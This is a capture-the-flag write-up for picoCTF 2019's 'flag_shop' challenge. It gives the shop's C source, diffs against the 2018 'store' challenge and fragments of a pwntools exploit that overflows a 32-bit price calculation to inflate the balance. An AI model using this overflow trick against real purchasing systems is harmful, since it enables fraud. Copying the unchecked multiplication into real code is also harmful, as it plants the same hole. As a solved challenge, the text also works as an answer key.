# flag_shop
General Skills, 300 points

## Description:
> There's a flag shop selling stuff, can you buy a flag?

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                }
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }
                }
            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}

```


## Solution: 


This challenge is similar to last year's [store](/2018_picoCTF/store.md). 

Most of the differences are related to strings:
```console
root@kali:/media/sf_CTFs/pico/flag_shop# diff store.c ../../pico_2018/store/source.c
5d4
<     setbuf(stdout, NULL);
11,12c10,11
<         printf("Welcome to the flag exchange\n");
<         printf("We sell flags\n");
---
>         printf("Welcome to the Store App V1.0\n");
>         printf("World's Most Secure Purchasing App\n");
14,16c13,15
<         printf("\n1. Check Account Balance\n");
<         printf("\n2. Buy Flags\n");
<         printf("\n3. Exit\n");
---
>         printf("\n[1] Check Account Balance\n");
>         printf("\n[2] Buy Stuff\n");
>         printf("\n[3] Exit\n");
25,27c24,26
<             printf("Currently for sale\n");
<             printf("1. Defintely not the flag Flag\n");
<             printf("2. 1337 Flag\n");
---
>             printf("Current Auctions\n");
>             printf("[1] I Can't Believe its not a Flag!\n");
>             printf("[2] Real Flag\n");
32c31
<                 printf("These knockoff Flags cost 900 each, enter desired quantity\n");
---
>                 printf("Imitation Flags cost 1000 each, how many would you like?\n");
39,40c38,39
<                     total_cost = 900*number_flags;
<                     printf("\nThe final cost is: %d\n", total_cost);
---
>                     total_cost = 1000*number_flags;
>                     printf("\nYour total cost is: %d\n", total_cost);
43c42
<                         printf("\nYour current balance after transaction: %d\n\n", account_balance);
---
>                         printf("\nYour new balance: %d\n\n", account_balance);
46c45
<                         printf("Not enough funds to complete purchase\n");
---
>                         printf("Not enough funds\n");
57,58c56,57
<                 printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
<                 printf("Enter 1 to buy one");
---
>                 printf("A genuine Flag costs 100000 dollars, and we only have 1 in stock\n");
>                 printf("Enter 1 to purchase");
66,74c65
<                         FILE *f = fopen("flag.txt", "r");
<                         if(f == NULL){
<
<                             printf("flag not found: please run this on the server\n");
<                             exit(0);
<                         }
<                         char buf[64];
<                         fgets(buf, 63, f);
<                         printf("YOUR FLAG IS: %s\n", buf);
---
>                         printf("YOUR FLAG IS:\n");
```

The only difference that affects the solution is the fact that flags now cost 900 each, instead of 1000.

This requires the following changes in the exploit:
```console
root@kali:/media/sf_CTFs/pico/flag_shop# diff exploit.py ../../pico_2018/store/exploit.py
3c3
< r = remote("2019shell1.picoctf.com", 29250)
---
> r = remote("2018shell3.picoctf.com", 43581)
24,26c24,26
<     r.sendlineafter("2. 1337 Flag\n", FLAG_IMITATION)
<     r.sendlineafter("These knockoff Flags cost 900 each, enter desired quantity", str(amount))
<     print r.recvregex("Your current balance after transaction: \d+\n").strip()
---
>     r.sendlineafter("[2] Real Flag\n", FLAG_IMITATION)
>     r.sendlineafter("Imitation Flags cost 1000 each, how many would you like?", str(amount))
>     print r.recvregex("Your new balance: \d+\n").strip()
31,32c31,32
<     r.sendlineafter("2. 1337 Flag\n", FLAG_REAL)
<     r.sendlineafter("Enter 1 to buy one", BUY_REAL_FLAG)
---
>     r.sendlineafter("[2] Real Flag\n", FLAG_REAL)
>     r.sendlineafter("Enter 1 to purchase", BUY_REAL_FLAG)
42c42
< buy_imitation_flag(3333333)
---
> buy_imitation_flag(2222222)
```

2222222 flags won't do anymore, since that would bring us to a negative balance, we must buy 3333333 instead to trigger the overflow.

```python
>>> 1100 - numpy.int32(2222222*900)
-1999998700
>>> 1100 - numpy.int32(3333333*900)
1294968696
```